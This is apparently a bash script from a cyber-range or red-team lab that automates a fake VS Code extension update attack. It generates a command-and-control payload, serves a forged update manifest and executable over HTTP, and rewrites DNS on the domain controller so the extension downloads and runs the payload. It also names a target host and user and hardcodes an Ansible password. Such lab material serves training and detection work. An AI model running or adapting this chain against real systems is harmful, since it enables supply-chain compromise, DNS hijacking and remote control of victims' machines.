#!/bin/bash
#
# Scenario: VS Code "vault-sdk-snippets" fake extension update (DNS on DC + HTTP manifest on attack box).
#
# Attack chain:
#   1. Extension polls updates.vaulttools.io for a manifest.
#   2. This script adds DNS on the DC so that name points at the attack server.
#   3. A fake manifest + "update" exe are served; the extension downloads and runs your C2 payload.
#
# Prerequisites: lab deployed. Often run after attack_serve_c2_payload_for_web_phishing.sh;
#                this script uses its own listener port 4445.
#
# Optional: C2_FRAMEWORK=metasploit|sliver|mythic|havoc (default: metasploit)
#
set -e

REGION="${1:-apac}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=/dev/null
source "${SCRIPT_DIR}/attack_c2_helpers/runner_lib.sh"
c2_validate_framework

SSH_KEY="terraform/certs/project-responder-ssh"
ATTACK_USER="ubuntu"
LPORT="4445"
HTTP_PORT="8081"
FAKE_VERSION="1.3.0"
PAYLOAD_NAME="vault-sdk-snippets-${FAKE_VERSION}.exe"

ATTACK_DETAILS="inventory/attack_server_details_${REGION}"
BASTION_DETAILS="inventory/bastion_server_details_${REGION}"

if [ ! -f "${ATTACK_DETAILS}" ]; then
    echo "[!] Attack details file not found: ${ATTACK_DETAILS}"
    echo "    Usage: $0 <region>  (e.g. apac, star, amer, emea, test-env)"
    exit 1
fi
if [ ! -f "${BASTION_DETAILS}" ]; then
    echo "[!] Bastion details file not found: ${BASTION_DETAILS}"
    exit 1
fi

ATTACK_IP=$(awk '/^Linux Bastion Public IP:/ { print $5 }' "${ATTACK_DETAILS}")
BASTION_IP=$(awk '/^Linux Bastion Public IP:/ { print $5 }' "${BASTION_DETAILS}")

if [ -z "${ATTACK_IP}" ]; then
    echo "[!] Could not extract attack server IP from ${ATTACK_DETAILS}"
    exit 1
fi
if [ -z "${BASTION_IP}" ]; then
    echo "[!] Could not extract bastion IP from ${BASTION_DETAILS}"
    exit 1
fi

SSH_OPTS="-i ${SSH_KEY} -o StrictHostKeyChecking=no"

echo "============================================"
echo "  VS Code fake extension update scenario"
echo "============================================"
echo ""
echo "[*] Region:         ${REGION}"
echo "[*] C2_FRAMEWORK:   ${C2_FRAMEWORK}"
echo "[*] Attack server:  ${ATTACK_IP}"
echo "[*] Linux bastion:  ${BASTION_IP}"
echo "[*] Payload:        ${PAYLOAD_NAME}"
echo "[*] Listener port:  ${LPORT}"
echo ""

echo "=========================================="
echo "  Phase 1: Fake update HTTP server"
echo "=========================================="
echo ""

ATTACK_PUBLIC_IP=$(ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" bash -s <<'GETIP'
curl -s http://169.254.169.254/latest/meta-data/public-ipv4
GETIP
)
echo "[*] Attack server public IP: ${ATTACK_PUBLIC_IP}"

c2_remote_payload "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "${ATTACK_PUBLIC_IP}" "${LPORT}" "/home/ubuntu/${PAYLOAD_NAME}"

VS_LISTENER_DOC="/home/ubuntu/vscode_listener.rc"
if [[ "${C2_FRAMEWORK}" != "metasploit" ]]; then
  VS_LISTENER_DOC="/home/ubuntu/vscode_listener_operator.txt"
fi
c2_remote_listener_doc "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "${LPORT}" "${VS_LISTENER_DOC}" "${ATTACK_PUBLIC_IP}"

ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" \
  env PAYLOAD_NAME="${PAYLOAD_NAME}" FAKE_VERSION="${FAKE_VERSION}" HTTP_PORT="${HTTP_PORT}" \
  bash -s <<'REMOTE_SETUP'
set -e
echo "[*] Setting up fake update directory structure..."
mkdir -p /home/ubuntu/vscode-updates/api/v1
mkdir -p /home/ubuntu/vscode-updates/updates

cp "/home/ubuntu/${PAYLOAD_NAME}" "/home/ubuntu/vscode-updates/updates/${PAYLOAD_NAME}"

cat > /home/ubuntu/vscode-updates/api/v1/manifest.json <<MANIFEST
{
    "name": "vault-sdk-snippets",
    "version": "${FAKE_VERSION}",
    "releaseDate": "2026-03-01",
    "downloadUrl": "http://updates.vaulttools.io:${HTTP_PORT}/updates/${PAYLOAD_NAME}",
    "changelog": "Security fixes and performance improvements",
    "sha256": "$(sha256sum /home/ubuntu/vscode-updates/updates/${PAYLOAD_NAME} 2>/dev/null | cut -d' ' -f1 || echo 'N/A')"
}
MANIFEST
echo "[+] Manifest written to /home/ubuntu/vscode-updates/api/v1/manifest.json"

fuser -k "${HTTP_PORT}"/tcp 2>/dev/null || true

echo "[*] Starting HTTP server on port ${HTTP_PORT} (serving /home/ubuntu/vscode-updates/)..."
cd /home/ubuntu/vscode-updates
nohup python3 -m http.server "${HTTP_PORT}" > /tmp/vscode_http.log 2>&1 &
echo "[+] HTTP server PID: $!"

REMOTE_SETUP

echo ""
echo "=========================================="
echo "  Phase 2: DNS (updates.vaulttools.io on DC)"
echo "=========================================="
echo ""
echo "[*] Adding DNS A record: updates.vaulttools.io -> ${ATTACK_PUBLIC_IP}"

ssh ${SSH_OPTS} "ubuntu@${BASTION_IP}" bash -s <<DNS_SETUP
cd /home/ubuntu
ansible -i windows/inventory/windows_ansible_inventory_file_${REGION} dc \
    -m win_shell \
    -a "Remove-DnsServerResourceRecord -ZoneName 'vaulttools.io' -Name 'updates' -RRType A -Force -ErrorAction SilentlyContinue; Add-DnsServerResourceRecordA -Name 'updates' -ZoneName 'vaulttools.io' -IPv4Address '${ATTACK_PUBLIC_IP}'" \
    -e ansible_password=tsgInt3rnal \
    2>/dev/null
DNS_SETUP

echo "[+] DNS record created: updates.vaulttools.io -> ${ATTACK_PUBLIC_IP}"

echo ""
echo "=========================================="
echo "  Scenario ready"
echo "=========================================="
echo ""
echo "  Extension polls: http://updates.vaulttools.io:${HTTP_PORT}/api/v1/manifest.json"
echo "  Download URL in manifest → port ${HTTP_PORT}"
echo "  Callback: ${C2_FRAMEWORK} @ ${ATTACK_PUBLIC_IP}:${LPORT}"
echo "  Target: client-3  10.0.1.12 (sam.hewitt)"
echo ""
echo "  HTTP log: ssh ${SSH_OPTS} ${ATTACK_USER}@${ATTACK_IP} tail -f /tmp/vscode_http.log"
echo ""

if [[ "${C2_FRAMEWORK}" == "metasploit" ]]; then
  echo "[*] Metasploit tmux: msf-vscode"
  c2_start_listener_tmux_or_print "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "msf-vscode" "/home/ubuntu/vscode_listener.rc"
else
  echo "[*] Start ${C2_FRAMEWORK} listener on port ${LPORT}, then open VS Code on client-3."
  echo "    ssh ${SSH_OPTS} ${ATTACK_USER}@${ATTACK_IP} 'cat ${VS_LISTENER_DOC}'"
fi
